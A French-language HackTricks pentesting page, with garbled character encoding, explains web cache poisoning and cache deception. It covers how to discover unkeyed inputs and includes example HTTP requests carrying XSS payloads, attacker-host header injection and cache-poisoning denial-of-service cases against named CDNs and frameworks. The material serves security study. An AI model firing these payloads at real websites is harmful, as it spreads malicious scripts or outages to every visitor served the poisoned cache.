# Empoisonnement et tromperie de cache

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.io/) pour crÃ©er et **automatiser facilement des workflows** alimentÃ©s par les outils communautaires les plus avancÃ©s au monde.\
Obtenez l'accÃ¨s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## La diffÃ©rence

> **Quelle est la diffÃ©rence entre l'empoisonnement de cache web et la tromperie de cache web ?**
>
> * Dans l'**empoisonnement de cache web**, l'attaquant fait en sorte que l'application stocke un contenu malveillant dans le cache, et ce contenu est servi Ã  partir du cache Ã  d'autres utilisateurs de l'application.
> * Dans la **tromperie de cache web**, l'attaquant fait en sorte que l'application stocke un contenu sensible appartenant Ã  un autre utilisateur dans le cache, et l'attaquant rÃ©cupÃ¨re ensuite ce contenu Ã  partir du cache.

## Empoisonnement de cache

L'objectif de l'empoisonnement de cache est de faire en sorte que les **clients chargent des ressources inattendues partiellement ou contrÃ´lÃ©es par l'attaquant**.\
La rÃ©ponse empoisonnÃ©e ne sera servie qu'aux utilisateurs qui visitent la page affectÃ©e pendant que le cache est empoisonnÃ©. Par consÃ©quent, l'impact peut aller de nul Ã  massif selon que la page est populaire ou non.

Pour effectuer une attaque d'empoisonnement de cache, vous devez d'abord **identifier les entrÃ©es non clÃ©s** (paramÃ¨tres qui n'ont pas besoin d'apparaÃ®tre sur la demande mise en cache mais qui modifient la page renvoyÃ©e), voir **comment abuser** de ce paramÃ¨tre et **obtenir la rÃ©ponse mise en cache**.

### DÃ©couverte : VÃ©rifier les en-tÃªtes HTTP

GÃ©nÃ©ralement, lorsqu'une rÃ©ponse a Ã©tÃ© **stockÃ©e dans le cache**, il y aura un **en-tÃªte indiquant cela**, vous pouvez vÃ©rifier quels en-tÃªtes vous devez surveiller dans ce post : [**En-tÃªtes de cache HTTP**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### DÃ©couverte : Mise en cache du code 400

Si vous pensez que la rÃ©ponse est mise en cache, vous pouvez essayer d'**envoyer des demandes avec un en-tÃªte incorrect**, qui devrait Ãªtre rÃ©pondu avec un **code d'Ã©tat 400**. Ensuite, essayez d'accÃ©der Ã  la demande normalement et si la **rÃ©ponse est un code d'Ã©tat 400**, vous savez qu'elle est vulnÃ©rable (et vous pourriez mÃªme effectuer un DoS).\
Un en-tÃªte mal configurÃ© pourrait Ãªtre simplement `\:` comme en-tÃªte.\
Notez que parfois ces types de codes d'Ã©tat ne sont pas mis en cache, donc ce test sera inutile.

### DÃ©couverte : Identifier et Ã©valuer les entrÃ©es non clÃ©s

Vous pouvez utiliser [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) pour **forcer les paramÃ¨tres et les en-tÃªtes** qui peuvent **modifier la rÃ©ponse de la page**. Par exemple, une page peut utiliser l'en-tÃªte `X-Forwarded-For` pour indiquer au client de charger le script Ã  partir de lÃ  :
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Obtenir une rÃ©ponse mise en cache

Une fois que vous avez **identifiÃ©** la **page** qui peut Ãªtre exploitÃ©e, quel **paramÃ¨tre**/**en-tÃªte** utiliser et **comment** l'exploiter, vous devez obtenir la page mise en cache. Selon la ressource que vous essayez de mettre en cache, cela peut prendre du temps, vous devrez peut-Ãªtre essayer pendant plusieurs secondes.\
L'en-tÃªte **`X-Cache`** dans la rÃ©ponse peut Ãªtre trÃ¨s utile car il peut avoir la valeur **`miss`** lorsque la requÃªte n'a pas Ã©tÃ© mise en cache et la valeur **`hit`** lorsqu'elle est mise en cache.\
L'en-tÃªte **`Cache-Control`** est Ã©galement intÃ©ressant pour savoir si une ressource est mise en cache et quand la prochaine fois que la ressource sera mise en cache: `Cache-Control: public, max-age=1800`\
Un autre en-tÃªte intÃ©ressant est **`Vary`**. Cet en-tÃªte est souvent utilisÃ© pour **indiquer des en-tÃªtes supplÃ©mentaires** qui sont traitÃ©s comme **partie de la clÃ© de cache** mÃªme s'ils ne sont normalement pas clÃ©s. Par consÃ©quent, si l'utilisateur connaÃ®t l'`User-Agent` de la victime qu'il cible, il peut empoisonner le cache pour les utilisateurs utilisant cet `User-Agent` spÃ©cifique.\
Un autre en-tÃªte liÃ© au cache est **`Age`**. Il dÃ©finit les temps en secondes pendant lesquels l'objet a Ã©tÃ© dans le cache proxy.

Lors de la mise en cache d'une requÃªte, soyez **prudent avec les en-tÃªtes que vous utilisez** car certains d'entre eux pourraient Ãªtre **utilisÃ©s de maniÃ¨re inattendue** comme **clÃ©s** et la **victime devra utiliser le mÃªme en-tÃªte**. Testez toujours un empoisonnement de cache avec **diffÃ©rents navigateurs** pour vÃ©rifier si cela fonctionne.

## Exemples d'exploitation

### Exemple le plus simple

Un en-tÃªte comme `X-Forwarded-For` est rÃ©flÃ©chi dans la rÃ©ponse non-sanitisÃ©e.\
Vous pouvez envoyer une charge utile XSS de base et empoisonner le cache pour que tout le monde qui accÃ¨de Ã  la page soit XSSÃ©:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Remarque que cela va empoisonner une requÃªte Ã  `/en?region=uk` et non Ã  `/en`_

### Utilisation de l'empoisonnement du cache web pour exploiter les vulnÃ©rabilitÃ©s de gestion des cookies

Les cookies peuvent Ã©galement Ãªtre reflÃ©tÃ©s dans la rÃ©ponse d'une page. Si vous pouvez l'abuser pour causer une XSS par exemple, vous pourriez Ãªtre en mesure d'exploiter la XSS dans plusieurs clients qui chargent la rÃ©ponse de cache malveillante.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Notez que si le cookie vulnÃ©rable est trÃ¨s utilisÃ© par les utilisateurs, les requÃªtes rÃ©guliÃ¨res nettoieront le cache.

### Utilisation de plusieurs en-tÃªtes pour exploiter les vulnÃ©rabilitÃ©s de l'empoisonnement du cache web <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Parfois, vous devrez **exploiter plusieurs entrÃ©es non clÃ©s** pour pouvoir abuser d'un cache. Par exemple, vous pouvez trouver une **redirection ouverte** si vous dÃ©finissez `X-Forwarded-Host` sur un domaine contrÃ´lÃ© par vous et `X-Forwarded-Scheme` sur `http`. **Si** le **serveur** **redirige** toutes les demandes **HTTP** vers HTTPS et utilise l'en-tÃªte `X-Forwarded-Scheme` comme nom de domaine pour la redirection. Vous pouvez contrÃ´ler oÃ¹ la page est dirigÃ©e par la redirection.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Exploitation avec un en-tÃªte `Vary` limitÃ©

Si vous avez dÃ©couvert que l'en-tÃªte **`X-Host`** est utilisÃ© comme **nom de domaine pour charger une ressource JS** mais que l'en-tÃªte **`Vary`** dans la rÃ©ponse indique **`User-Agent`**, alors vous devez trouver un moyen d'exfiltrer le User-Agent de la victime et de contaminer le cache en utilisant cet User-Agent :
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Exploitation de l'empoisonnement du cache HTTP en abusant du trafic HTTP Request Smuggling

Apprenez ici comment effectuer des attaques de Poisoning de Cache en abusant du trafic HTTP Request Smuggling.

### Tests automatisÃ©s pour l'empoisonnement du cache Web

Le scanner de vulnÃ©rabilitÃ© de cache Web peut Ãªtre utilisÃ© pour tester automatiquement l'empoisonnement du cache Web. Il prend en charge de nombreuses techniques diffÃ©rentes et est hautement personnalisable.

Exemple d'utilisation : `wcvs -u example.com`

![](<../.gitbook/assets/image (9) (1) (2).png>)

Utilisez [**Trickest**](https://trickest.io/) pour crÃ©er et automatiser facilement des workflows alimentÃ©s par les outils communautaires les plus avancÃ©s au monde.\
Obtenez l'accÃ¨s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Exemples vulnÃ©rables

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS a transmis le fragment dans l'URL sans le supprimer et a gÃ©nÃ©rÃ© la clÃ© de cache en utilisant uniquement l'hÃ´te, le chemin et la requÃªte (en ignorant le fragment). Ainsi, la requÃªte `/#/../?r=javascript:alert(1)` a Ã©tÃ© envoyÃ©e au backend en tant que `/#/../?r=javascript:alert(1)` et la clÃ© de cache n'avait pas la charge utile Ã  l'intÃ©rieur, seulement l'hÃ´te, le chemin et la requÃªte.

### GitHub CP-DoS

L'envoi d'une mauvaise valeur dans l'en-tÃªte de type de contenu a dÃ©clenchÃ© une rÃ©ponse mise en cache 405. La clÃ© de cache contenait le cookie, il Ã©tait donc possible d'attaquer uniquement les utilisateurs non authentifiÃ©s.

### GitLab + GCP CP-DoS

GitLab utilise des compartiments GCP pour stocker le contenu statique. Les compartiments GCP prennent en charge l'en-tÃªte `x-http-method-override`. Il Ã©tait donc possible d'envoyer l'en-tÃªte `x-http-method-override: HEAD` et de contaminer le cache pour renvoyer un corps de rÃ©ponse vide. Il pourrait Ã©galement prendre en charge la mÃ©thode `PURGE`.

### Middleware Rack (Ruby on Rails)

L'application Ruby on Rails est souvent dÃ©ployÃ©e aux cÃ´tÃ©s du middleware Rack. Le code Rack ci-dessous prend la valeur de la valeur **`x-forwarded-scheme` et l'utilise comme schÃ©ma de la requÃªte**.

![](<../.gitbook/assets/image (159) (2).png>)

L'envoi de l'en-tÃªte `x-forwarded-scheme: http` entraÃ®nerait une redirection 301 vers le mÃªme emplacement, ce qui provoquerait un DoS sur cette ressource comme dans cet exemple :

![](<../.gitbook/assets/image (166).png>)

L'application pourrait Ã©galement prendre en charge l'en-tÃªte `X-forwarded-host` et rediriger l'utilisateur vers cet hÃ´te, ce qui permettrait de charger des fichiers JavaScript Ã  partir du serveur de l'attaquant :

![](<../.gitbook/assets/image (157) (2).png>)

### 403 et compartiments de stockage

Auparavant, Cloudflare avait l'habitude de mettre en cache les rÃ©ponses 403, donc l'envoi de mauvais en-tÃªtes d'autorisation en essayant d'accÃ©der Ã  S3 ou Azure Storage Blobs exposÃ©s renverrait un 403 qui serait mis en cache. Cloudflare ne met plus en cache les rÃ©ponses 403, mais cela pourrait fonctionner avec d'autres proxys.

![](<../.gitbook/assets/image (171).png>)

### Injection de paramÃ¨tres clÃ©s

TrÃ¨s souvent, les caches sont configurÃ©s pour **inclure uniquement des paramÃ¨tres GET spÃ©cifiques dans la clÃ© de cache**.

Par exemple, Fastly utilisant Varnish **a mis en cache le paramÃ¨tre `size`** dans la requÃªte, mais si vous envoyez Ã©galement le paramÃ¨tre **`siz%65`** avec une mauvaise valeur, la **clÃ© de cache** est construite avec le **paramÃ¨tre de taille bien Ã©crit**, mais le **backend** utilise la **valeur Ã  l'intÃ©rieur du paramÃ¨tre encodÃ© dans l'URL**.

![](<../.gitbook/assets/image (180).png>)

L'encodage d'URL du deuxiÃ¨me paramÃ¨tre `size` a entraÃ®nÃ© son ignorance par le cache, mais utilisÃ© par le backend. Donner au paramÃ¨tre une valeur de 0 entraÃ®nerait une demande incorrecte 400 mise en cache.

### RÃ¨gles de l'agent utilisateur

En raison du grand nombre de demandes gÃ©nÃ©rÃ©es par des outils tels que FFUF ou Nuclei, certains dÃ©veloppeurs ont dÃ©cidÃ© de bloquer les demandes correspondant Ã  leurs agents utilisateurs. Ironiquement, ces ajustements peuvent introduire des opportunitÃ©s d'empoisonnement de cache et de DoS indÃ©sirables.

![](<../.gitbook/assets/image (167) (2).png>)

J'ai constatÃ© que cela fonctionnait sur plusieurs cibles, avec des agents utilisateurs provenant d'outils ou de scanners diffÃ©rents.

### Champs d'en-tÃªte illÃ©gaux

Le format du nom d'en-tÃªte est dÃ©fini dans [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) comme suit :

![](<../.gitbook/assets/image (175) (2).png>)

En thÃ©orie, si un nom d'en-tÃªte contient des caractÃ¨res autres que ceux rÃ©pertoriÃ©s dans **tchar**, il devrait Ãªtre rejetÃ© avec une demande incorrecte 400. En pratique, cependant, les serveurs ne respectent pas toujours le RFC. La faÃ§on la plus simple d'exploiter cette nuance Ã©tait de cibler Akamai qui ne rejette pas les en-tÃªtes invalides, mais les transmet et met en cache toute erreur 400 tant que l'en-tÃªte de contrÃ´le de cache n'est pas prÃ©sent.

![](<../.gitbook/assets/image (163).png>)

L'envoi d'un en-tÃªte contenant un caractÃ¨re illÃ©gal, `\`, provoquerait une erreur de demande incorrecte 400 mise en cache
